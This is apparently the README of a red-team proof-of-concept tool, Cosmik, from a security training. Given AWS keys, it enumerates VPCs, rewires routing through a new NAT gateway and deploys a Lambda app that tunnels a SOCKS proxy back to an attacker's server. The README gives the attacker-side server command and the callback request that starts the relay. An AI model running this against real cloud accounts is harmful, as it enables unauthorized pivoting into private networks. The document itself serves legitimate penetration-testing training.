## Description

Cosmik was built to automate the enumeration and configuration of AWS infrastructure to enable testers to deploy a Zappa application that should be capable of communicating:

1) With the attacker
2) With a target VPC

Quickstart:

```
# after git clone
virtualenv venv
source venv/bin/activate
pip install -r REQUIREMENTS.txt
python cosmik.py --access-key <access key> --secret-key <secret key>
```

Usage:

```
usage: cosmik.py [-h] --access-key KEY --secret-key SECRET

Proxy into a VPC via AWS lambda 

optional arguments:
  -h, --help           show this help message and exit
  --access-key KEY     AWS access key ID
  --secret-key SECRET  AWS secret key
```

### What does cosmik do?
In order:
  - Enumeration
    - Finds VPCs
    - Describes all subnets in those VPCs and their availability zones
    - Enumerates security groups
    - Enumerates subnets
    - Finds subnet for use as public (routed through internet gateway)
        - POC Note: A route table, associated with a subnet pointing through an internet gateway is required
        - BH Training Note: This is already the case for the 10.0.1.0/24 network
  - Attack
    - Allocates a new Elastic IP
    - Stands up a NAT gateway with the EIP
        - Note: NAT Gateways cost money to operate based on traffic
    - Creates one route table and associates it with the target (private) subnet
        - Route table will have a destination CIDR of 0.0.0.0/0 and point to the NAT, associated with private subnet
    - Generates Zappa vpc_config options and writes it over current zappa_settings.json
        - Note: zappa_settings.json must exist before running, and it should be deployable with the exception of knowing the VPC, subnet, and security group configuration

### What is this zappa application?
It's a tiny Flask app that calls back to a server and extends a SOCKS proxy into the target VPC. It utilizes [AlmondRocks](https://github.com/klustic/AlmondRocks), so please see that documentation before kicking off your SOCKS relay. 

Below is a quickstart example:

On your server (should be publicly accessible):
```bash
python arox.py server --cert ssl/cert.pem --key ssl/key.pem
```
By default, it will listen on port 4433. For our example, we'll just keep it that way. You should see something like this on your server:
```
WARNING SocksServer: Waiting for Tunnel connections on 0.0.0.0:4433
```

Once you have run cosmik.py, you can deploy the zappa application with the modified vpc_config:
```bash
$ zappa deploy dev
Calling deploy for stage dev..
Downloading and installing dependencies..
Packaging project as zip.
Uploading cosmik-dev-1531340378.zip (5.4MiB)..
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 5.66M/5.66M [00:01<00:00, 3.32MB/s]
Scheduling..
Scheduled cosmik-dev-zappa-keep-warm-handler.keep_warm_callback with expression rate(4 minutes)!
Uploading cosmik-dev-template-1531340395.json (1.6KiB)..
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1.60K/1.60K [00:00<00:00, 7.50KB/s]
Waiting for stack cosmik-dev to create (this can take a bit)..
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 4/4 [00:09<00:00,  2.81s/res]
Deploying API Gateway..
Deployment complete!: https://someapigatewayurl.amazonaws.com/dev
```

Now that the app is deployed, and your SOCKS server is listening, you can kick off a relay by making a GET request like:
`https://someapigatewayurl.amazonaws.com/dev/socks/<server_ip>:<server_port>`

One very important thing to note is that this will kick off a new lambda when executed. The maximum execution time for those lambdas is 5 minutes, so your tunnel will die when that time is up. Since this is just a PoC, we'll deal with it for now.

## Caveats

There are a few things you should check/change before running this in your environment:

  - The region is a variable near the top of the script
  - The script does not clean anything up. Remember to remove/release infrastructure (NAT Gateways), routes, subnets, roles, zappa deployments, and EIPs when your attack is complete
  - The SOCKS relay will die after 5 minutes (maximum lambda execution time). Kick it off again (after setting up a new server), or find a way to continuously execute new relays and servers.

## Cosmik?

https://www.youtube.com/watch?v=Dp6LT2MdaPI